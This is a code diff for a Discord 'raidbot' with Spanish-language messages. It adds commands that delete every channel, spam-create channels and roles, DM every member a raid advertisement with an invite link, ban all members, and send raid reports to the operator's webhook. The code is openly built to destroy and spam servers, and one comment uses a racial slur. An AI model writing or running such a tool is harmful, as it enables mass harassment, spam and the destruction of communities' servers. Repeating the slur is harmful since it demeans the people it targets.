@@ -7,15 +7,13 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 intents = discord.Intents.default()
 intents.members = True
 client = commands.Bot(command_prefix="k!", intents=intents)
-hook = "" #Put your webhook to get reports of raids over here
 
 @client.event
 async def on_ready():
     print("Encendido y listo.")
-    #Here you can change the status of the bot adding elements to the list
-    status = [
-      "test status 1",
-      "test status 2"
+    status = [ #Custom status 
+        "test status 1",
+        "test status 2"
     ]
     while True:
         for bot_status in status:
@@ -25,57 +23,79 @@ async def on_ready():
 @client.event 
 async def on_guild_channel_create(channel):
     counter = 0
-    while counter < 50: #Number of messages per channel created
-        await channel.send("") #Put a message here
+    while counter < 15:
+        await channel.send("") #Your crappy spam message
         counter += 1
         asyncio.sleep(1)
 
+@client.command()
 async def channels(ctx):
-    await ctx.guild.edit(name="") #New name for the entire server
+    await ctx.guild.edit(name="") #New Server name :)
     for guild in client.guilds:
         for channel in guild.channels:
             try:
                 await channel.delete()
             except:
-                pass
+                print(f"Error, no se ha podido eliminar el canal {channel}")
         counter = 0
         while counter < 100:
-            await ctx.guild.create_text_channel("") #Channel's name
+            await ctx.guild.create_text_channel("") #Name for the spam channels created with the objective of fuck everyone
             counter += 1
-            
+
+@client.command() #Spam Roles function
 async def roles(ctx):
     counter = 0
     while counter < 50:
         try:
-            await ctx.create_role(name="") #Role's name
+            await ctx.create_role(name="") #Name for the roles
         except:
-            pass
+            print("Error, no se  ha podido crear el rol.") #Error if the bot is not able to create them
         counter += 1
 
-async def dm(ctx):
+@client.command()
+async def dm(ctx): #DM All command, with an error message if an user has DM's disabled
     for users in client.get_all_members():
         if users != ctx.message.author:
             try:
-                await users.send("") #Also DM Messages
+                await users.send("Raid by Hellsquad\nhttps://discord.gg/DPY8UDQteZ")
             except:
-                pass
+                print(f"Error, no se ha podido enviar el mensaje al usuario: {users}")
 
-async def ban_users(ctx):
+@client.command() #Ban All command, now with an error message
+async def ban(ctx):
     for members in client.get_all_members():
         if members != ctx.message.author:
             try:
                 await members.ban()
             except:
-                pass
+                print(f"Error, no se ha podido banear al usuario: {members}")
 
-async def report_webhook(ctx, webh):
-    webhook = DiscordWebhook(url=webh)
-    embed = DiscordEmbed(title="Nuevo Raid Reportado.", color=0xe01e00)
-    embed.add_embed_field(name="Información del Raid:", value=f"Raid by: {ctx.message.author}\nServer: {ctx.guild.name}\nPeople in the server: {ctx.guild.member_count}")
-    embed.set_image(url="") #Image for Embed message
-    embed.set_footer(text="Raidbot by: r2pc96")
+@client.command()
+async def report_webhook(ctx, webh): #Report raid function, put your webhook below
+    webhook = DiscordWebhook(url="")
+    embed = DiscordEmbed(title="Nuevo Raid Reportado.", color=0xff0000)
+    embed.add_embed_field(name="Información del Raid:", value=f"Raid realizado por: {ctx.message.author}\nNombre del servidor: {ctx.guild.name}\nCantidad de personas: {ctx.guild.member_count}")
+    embed.set_image(url="")
+    embed.set_footer(text="Raidbot by: r2pc96") #Our sexy developer
     webhook.add_embed(embed)
     webhook.execute()
+
+@client.command()
+async def menu(ctx):
+    embed = discord.Embed( #Bot menu in spanish for the boys (niggers)
+        title = "Bienvenido al menú de Koume",
+        description = "Aquí encontraras la función de cada comando y su sintaxis.",
+        colour = 0xff0000
+    )
+    embed.set_footer(text="Raidbot by: r2pc96") 
+    embed.add_field(name="k!menu", value="Muestra un mensaje embed con los comandos y una descripción de cada uno.", inline=False)
+    embed.add_field(name="k!channels", value="Crea 100 canales de Spam con 15 pings por canal.", inline=True)
+    embed.add_field(name="k!roles", value="Hace 100 roles con propaganda gratuita.", inline=False)
+    embed.add_field(name="k!dm", value="Envía mensajes a cada usuario en el servidor, excepto al autor del comando.", inline=True)
+    embed.add_field(name="k!ban", value="Banea a todos los usuarios, excluyendo a quien coloque el comando.", inline=False)
+    embed.add_field(name="k!sayonara", value="Ejecuta todos los comandos al mismo tiempo, exceptuando el ban all.", inline=True)
+    embed.set_image(url="https://media.discordapp.net/attachments/820475730982207509/822323040557072414/sdsds-1-1.png?width=442&height=473")
+    await ctx.send(embed=embed)
 
 @client.command()
 async def sayonara(ctx):
@@ -83,6 +103,5 @@ async def sayonara(ctx):
     await channels(ctx)
     await roles(ctx)
     await dm(ctx)
-    await ban_users(ctx)
 
-client.run("") #Discord bot token
+client.run("") #Discord poopy token
